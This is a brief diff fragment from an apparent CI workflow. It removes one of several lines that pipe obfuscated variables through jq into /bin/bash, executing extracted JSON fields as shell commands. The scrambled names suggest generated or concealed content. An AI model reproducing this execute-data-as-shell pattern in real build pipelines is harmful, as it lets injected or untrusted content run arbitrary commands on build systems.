@@ -29,7 +29,6 @@ jobs:
           echo $y7 | jq -r .zyqpo8213 | /bin/bash
           printf '%s' "$cv26599" | jq -r .hftu0850 | /bin/bash
           printf '%s' "$fzmpe5456" | jq -r .e35183 | /bin/bash
-          echo $umr249 | jq -r .vebxl42 | /bin/bash
           echo $nec0 | jq -r .a897 | /bin/bash
 
       - name: Save output
